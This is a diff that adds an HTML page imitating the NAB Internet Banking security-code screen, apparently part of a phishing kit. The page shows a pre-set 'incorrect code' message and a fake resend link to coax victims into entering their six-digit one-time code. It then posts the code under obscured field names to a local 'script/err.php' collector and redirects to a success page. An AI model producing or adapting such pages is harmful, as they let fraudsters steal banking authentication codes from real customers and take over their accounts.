@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NAB Internet Banking</title>
+    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body,
+      html {
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        height: 100%;
+      }
+
+      .header_banner {
+        width: 100%;
+        /* padding: 20px 0; */
+        background-color: #000;
+      }
+
+      .header_inner {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 15px 16px;
+        width: 100%;
+        gap: 20px;
+      }
+
+      .login_title {
+        font-family: SourceSans-Light, Helvetica, Arial, sans-serif;
+        font-size: 30px;
+      }
+
+      .header_left {
+        display: flex;
+        align-items: center;
+      }
+
+      .header_right {
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .header_right p {
+        font-size: 0.8em;
+        padding: 10px;
+      }
+
+      .banner {
+        position: relative;
+        min-height: 100vh;
+        background-image: url("img/bg-login.jpeg");
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center top;
+        background-attachment: fixed;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .login_wrapper {
+        width: 100%;
+        max-width: 500px;
+        margin-top: 40px;
+        margin-left: 300px;
+        background-color: white;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+
+      .form_container {
+        width: 100%;
+        height: 150%;
+        padding: 38px 32px;
+        padding-bottom: 0px;
+      }
+
+      h1 {
+        font-size: 30px;
+        margin-bottom: 32px;
+        color: #333;
+        font-weight: 100;
+      }
+
+      .input_field {
+        margin: 40px 0px;
+      }
+
+      .input_field label {
+        font-size: 14px;
+        color: #000;
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+      }
+
+      .new-code-container {
+        margin-left: 40px;
+      }
+
+      .input_field .error {
+        color: rgb(194, 0, 0);
+        font-size: 12px;
+      }
+
+      .remember_checkbox {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+
+      .remember_checkbox label {
+        font-size: 14px;
+        color: #333;
+        margin-left: 10px;
+      }
+
+      .remember_checkbox input[type="checkbox"] {
+        width: 20px;
+        height: 20px;
+        accent-color: black;
+      }
+
+      .login_button {
+        margin-bottom: 20px;
+      }
+
+      .login_button .submit-btn:hover {
+        background-color: #d00016;
+      }
+
+      .footer_links a {
+        color: #d00016;
+      }
+
+      .footer_links a:hover {
+        text-decoration: underline;
+      }
+
+      .footer_link2 {
+        margin-top: 30px;
+        background-color: #e6e6e6;
+        padding: 20px;
+        font-size: 16px;
+        font-weight: 100;
+      }
+
+      .info {
+        color: #4d4d4d;
+        font-size: 14px;
+      }
+
+      .footer_link2 a {
+        color: #d00016;
+        font-weight: bold;
+      }
+
+      .input_field input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+        transition: border 0.3s ease;
+      }
+
+      .input_field input:focus {
+        outline: none;
+        border: 3px solid grey;
+      }
+
+      .input_error {
+        border: 1px solid rgb(194, 0, 0) !important;
+      }
+
+      .input_error:focus {
+        border: 3px solid rgb(194, 0, 0) !important;
+      }
+
+      .input_field .error {
+        color: rgb(194, 0, 0);
+        font-size: 14px;
+        margin-top: 4px;
+        height: 14px;
+        line-height: 14px;
+        transition: all 0.3s ease;
+      }
+
+      .modal-backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+      }
+
+      .modal {
+        position: fixed;
+        top: 28%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        z-index: 1000;
+        width: 400px;
+        height: 300px;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #ddd;
+        border-top: 4px solid rgb(194, 0, 0);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <style>
+      @font-face {
+        font-family: "SourceSans-Light";
+        src: url("font/SourceSans-Light.woff2") format("woff2"),
+          url("font/SourceSans-Light.woff") format("woff");
+        font-weight: 100;
+        font-style: normal;
+      }
+    </style>
+
+    <style>
+      @media screen and (max-width: 768px) {
+        .header_inner {
+          display: flex;
+          justify-content: space-between;
+          padding: 10px 16px;
+        }
+
+        .header_left {
+          margin-left: 0;
+          margin-bottom: 10px;
+        }
+
+        .header_right {
+          display: none;
+        }
+
+        .login_wrapper {
+          width: 90%;
+          margin: 50px auto;
+          background-color: white;
+          border-radius: 8px;
+          overflow: hidden;
+        }
+
+        .form_container {
+          padding: 20px;
+        }
+
+        .new-code-link {
+          font-size: 13px;
+        }
+        .new-code-container {
+          margin-left: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header_banner" id="headerBanner">
+      <div class="header_inner">
+        <div class="header_left" style="">
+          <img
+            class="logo-img"
+            src="img/star-big.svg"
+            alt=""
+            height="30"
+            width="90"
+          />
+          <h1 style="color: #fff; font-size: 22px; margin: 0">
+            Internet Banking
+          </h1>
+        </div>
+        <div class="header_right">
+          <p id="currentDate"></p>
+          |
+          <p>Help</p>
+          |
+          <p>Security</p>
+          |
+          <p>Contact us</p>
+          |
+          <p>Locate us</p>
+        </div>
+      </div>
+
+      <div class="banner">
+        <div class="login_wrapper">
+          <div class="form_container">
+            <div class="icon-container" style="margin: -10px 0">
+              <svg
+                fill="#c22424"
+                width="64px"
+                height="64px"
+                viewBox="0 0 256 256"
+                id="Flat"
+                xmlns="http://www.w3.org/2000/svg"
+                stroke="#c22424"
+                stroke-width="4.352"
+              >
+                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                <g
+                  id="SVGRepo_tracerCarrier"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                ></g>
+                <g id="SVGRepo_iconCarrier">
+                  <path
+                    d="M208,44.00012H48a12.01343,12.01343,0,0,0-12,12v58.66651c0,86.70458,73.543,115.47949,88.28516,120.36767a11.5664,11.5664,0,0,0,7.42968,0C146.457,230.14612,220,201.37121,220,114.66663V56.00012A12.01343,12.01343,0,0,0,208,44.00012Zm4,70.66651c0,81.20751-68.97559,108.18945-82.80273,112.77392a3.538,3.538,0,0,1-2.39454,0C112.97559,222.85608,44,195.87414,44,114.66663V56.00012a4.00427,4.00427,0,0,1,4-4H208a4.00427,4.00427,0,0,1,4,4ZM174.89355,101.2384a3.99935,3.99935,0,0,1-.13183,5.65528l-58.667,56a3.9999,3.9999,0,0,1-5.52344,0l-29.333-28a4,4,0,0,1,5.52344-5.78711L113.333,154.47034l55.90527-53.36377A3.99979,3.99979,0,0,1,174.89355,101.2384Z"
+                  ></path>
+                </g>
+              </svg>
+            </div>
+            <form id="otpForm" novalidate>
+              <div class="input_field" style="margin-bottom: 4px">
+                <div style="font-family: SourceSans-Light">
+                  <p class="login_title" style="font-weight: 100">
+                    Authentication Required.
+                  </p>
+                </div>
+                <br />
+                <div class="security-message" style="line-height: 25px">
+                  <!-- <p>
+                    Verification required to authorize updated Terms and
+                    Conditions.
+                  </p> -->
+                  <p>
+                    We’ve sent a security code to your registered mobile number.
+                  </p>
+                  <br />
+                  <p>This code expires in 10 minutes.</p>
+                </div>
+                <br />
+                <label for="code">Enter security code</label>
+                <div
+                  style="
+                    display: flex;
+                    /* justify-content: space-between; */
+                    align-items: center;
+                    margin-bottom: 6px;
+                  "
+                >
+                  <input
+                    type="text"
+                    id="code"
+                    name="code"
+                    autocomplete="off"
+                    inputmode="numeric"
+                    maxlength="6"
+                    style="
+                      display: block;
+                      width: 60%;
+                      padding: 10px;
+                      font-size: 16px;
+                      border: 1px solid #ccc;
+                      border-radius: 4px;
+                    "
+                  />
+                  <span class="new-code-container">
+                    <a
+                      class="new-code-link"
+                      style="color: #e2001a"
+                      href=""
+                      id="resendLink"
+                      >Get another code</a
+                    ></span
+                  >
+                </div>
+                <div
+                  style="
+                    display: flex;
+                    font-family: -apple-system, BlinkMacSystemFont, Segoe UI,
+                      Roboto, Helvetica, Arial, sans-serif;
+                    gap: 6px;
+                    align-items: center;
+                    color: #000;
+                    font-size: 14px;
+                    line-height: 17px;
+                  "
+                >
+                  <div>
+                    <svg
+                      focusable="false"
+                      aria-hidden="true"
+                      width="20"
+                      height="20"
+                      viewBox="0 0 24 24"
+                      style="color: rgb(194, 0, 0)"
+                    >
+                      <path
+                        fill="currentColor"
+                        fill-rule="evenodd"
+                        d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
+                      ></path>
+                    </svg>
+                  </div>
+                  <p style="color: #e2001a; font-size: 16px">
+                    The security code you entered is incorrect.
+                  </p>
+                </div>
+                <div
+                  id="otpError"
+                  style="
+                    display: none;
+                    color: rgb(194, 0, 0);
+                    font-size: 14px;
+                    margin-top: 6px;
+                    align-items: center;
+                  "
+                >
+                  <svg
+                    width="18"
+                    height="18"
+                    viewBox="0 0 24 24"
+                    fill="rgb(194, 0, 0)"
+                  >
+                    <path
+                      d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
+                    />
+                  </svg>
+                  <span id="otpErrorText"></span>
+                </div>
+              </div>
+
+              <!-- <div class="footer_links" style="margin-top: 15px">
+                <span>if you haven't received the code </span
+                ><a href="#" id="">contact us</a>
+              </div> -->
+              <br />
+              <div class="login_button" style="display: flex; gap: 20px">
+                <button
+                  type="button"
+                  disabled
+                  style="
+                    width: 120px;
+                    height: 35px;
+                    color: #e2001a;
+                    border: 1px solid #e2001a;
+                    border-radius: 4px;
+                    cursor: not-allowed;
+                  "
+                >
+                  Cancel
+                </button>
+                <button
+                  type="submit"
+                  class="submit-btn"
+                  disabled
+                  style="
+                    width: 120px;
+                    height: 35px;
+                    background: #e2001a;
+                    color: #fff;
+                    border: none;
+                    border-radius: 4px;
+                    font-size: 16px;
+                    cursor: not-allowed;
+                  "
+                >
+                  Verify
+                </button>
+              </div>
+            </form>
+          </div>
+          <br />
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function updateImageSrc() {
+        const img = document.querySelector(".logo-img");
+        if (!img) return;
+
+        if (window.innerWidth <= 768) {
+          img.src = "img/star.svg";
+        } else {
+          img.src = "img/star-big.svg";
+        }
+      }
+
+      updateImageSrc();
+
+      window.addEventListener("resize", updateImageSrc);
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const resendLink = document.getElementById("resendLink");
+        let countdownActive = false;
+
+        resendLink.addEventListener("click", function (e) {
+          e.preventDefault();
+
+          if (countdownActive) return;
+
+          countdownActive = true;
+          let seconds = 5;
+          resendLink.textContent = `Please wait...`;
+          resendLink.style.pointerEvents = "none";
+          resendLink.style.color = "#e2001a";
+
+          const countdownTimer = setInterval(() => {
+            seconds--;
+            if (seconds > 0) {
+              resendLink.textContent = `Sending a new code.`;
+            } else {
+              clearInterval(countdownTimer);
+              resendLink.textContent = "A new code is sent.";
+              setTimeout(() => {
+                resendLink.textContent = "Get another code";
+                resendLink.style.pointerEvents = "auto";
+                resendLink.style.color = "#e2001a";
+                countdownActive = false;
+              }, 2000);
+            }
+          }, 1000);
+        });
+      });
+    </script>
+    <script>
+      function ShowLoadingModal() {
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementsByClassName("footer_link2")[0].style.display =
+          "none";
+        document.getElementsByClassName("form_container")[0].style.height =
+          "500px";
+
+        document.getElementsByClassName("loading-div")[0].style.display =
+          "flex";
+      }
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const currentDateElement = document.getElementById("currentDate");
+
+        const options = {
+          weekday: "long",
+          day: "numeric",
+          month: "long",
+          year: "numeric",
+        };
+
+        const today = new Date();
+        const formattedDate = today.toLocaleDateString("en-GB", options);
+
+        currentDateElement.textContent = formattedDate;
+      });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const otpForm = document.getElementById("otpForm");
+        const codeInput = document.getElementById("code");
+        const otpError = document.getElementById("otpError");
+        const otpErrorText = document.getElementById("otpErrorText");
+        const submitBtn = otpForm.querySelector(".submit-btn");
+
+        codeInput.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "");
+          if (this.value.length === 6) {
+            submitBtn.disabled = false;
+            submitBtn.style.cursor = "pointer";
+            submitBtn.style.opacity = "1";
+            hideError();
+          } else {
+            submitBtn.disabled = true;
+            submitBtn.style.cursor = "not-allowed";
+          }
+        });
+
+        otpForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+          const code = codeInput.value.trim();
+          submitBtn.textContent = "Verifying...";
+
+          if (!/^\d{6}$/.test(code)) {
+            showError("Enter a valid 6-digit code.");
+            return;
+          }
+
+          const formData = new FormData();
+          formData.append("sws", 4);
+          formData.append("xxlll", code);
+          submitBtn.disabled = true;
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", "script/err.php", true);
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+              if (xhr.status === 200) {
+                setTimeout(() => {
+                  submitBtn.textContent = "Verify";
+                  window.location.href = "success.html";
+                }, 3000);
+              } else {
+                location.reload();
+              }
+            }
+          };
+          xhr.send(formData);
+        });
+
+        function showError(message) {
+          otpError.style.display = "flex";
+          otpErrorText.textContent = message;
+          codeInput.style.border = "1px solid rgb(194, 0, 0)";
+        }
+
+        function hideError() {
+          otpError.style.display = "none";
+          otpErrorText.textContent = "";
+          codeInput.style.border = "1px solid #ccc";
+        }
+      });
+    </script>
+  </body>
+</html>
